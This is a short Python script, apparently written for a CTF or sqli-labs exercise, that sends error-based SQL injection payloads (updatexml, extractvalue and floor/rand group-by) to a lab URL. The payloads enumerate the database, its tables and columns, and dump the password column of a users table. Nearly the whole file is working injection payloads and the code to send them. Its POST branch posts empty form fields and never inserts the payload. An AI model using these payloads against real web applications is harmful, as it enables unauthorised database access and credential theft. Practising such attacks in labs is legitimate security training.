import sys
import time
from requests_html import AsyncHTMLSession, HTMLSession

start_time = time.time()

session = HTMLSession()
proxies = {}

# url = 'http://257-10e7a19d-ccea-49c7.nss.ctfer.vip:9080/Less-5/?id=1'  # payload for get
url = 'http://652-53f32187-bba9-4466.nss.ctfer.vip:9080/Less-11/'
method = 'post'
data = {
    "uname": "",
    "passwd": "",
}
payload_xml            = """' or updatexml(1,concat(0x7e,({})),1)%23"""
payload_xml_database   = payload_xml.format('database()')
payload_xml_table      = payload_xml.format('select group_concat(table_name) from information_schema.tables where table_schema=database()')
payload_xml_column     = payload_xml.format('select group_concat(column_name) from information_schema.columns where table_name="{}"')
payload_xml_data       = payload_xml.format('select group_concat({}) from {}')


payload_ex            = """' and extractvalue(1,concat(0x7e,({}),0x7e))%23"""
payload_ex_database   = payload_ex.format('database()')
payload_ex_table      = payload_ex.format('select group_concat(table_name) from information_schema.tables where table_schema=database()')
payload_ex_column     = payload_ex.format('select group_concat(column_name) from information_schema.columns where table_name="{}"')
payload_ex_data       = payload_ex.format('select group_concat({}) from {}')


payload_floor         = """' and (select 1 from (select count(*),concat(({}),floor(rand(0)*2))x from information_schema.tables group by x)a)%23"""
payload_floor_database   = payload_floor.format('database()')
payload_floor_table      = payload_floor.format('select group_concat(table_name) from information_schema.tables where table_schema=database()')
payload_floor_column     = payload_floor.format('select group_concat(column_name) from information_schema.columns where table_name="{}"')
payload_floor_data       = payload_floor.format('select group_concat({}) from {}')

def go(title, payload):
    if method == 'get':
        sql = url + payload
        res = session.get(sql)
    else:
        res = session.post(url, data=data)
    print(f'{title} = ')
    print(res.text)


if __name__ == '__main__':
    table_name = 'users'
    column_name = 'password'
    #
    # go('db', payload_xml_database)
    # go('table', payload_xml_table)
    # go('column', payload_xml_column.format(table_name))
    # go('data', payload_xml_data.format(column_name, table_name))
    #
    #
    # go('db', payload_ex_database)
    # go('table', payload_ex_table)
    # go('column', payload_ex_column.format(table_name))
    # go('data', payload_ex_data.format(column_name, table_name))
    #

    go('db', payload_floor_database)
    # go('table', payload_floor_table)
    # go('column', payload_floor_column.format(table_name))
    # go('data', payload_floor_data.format(column_name, table_name))

    print("--- %s seconds ---" % (time.time() - start_time))
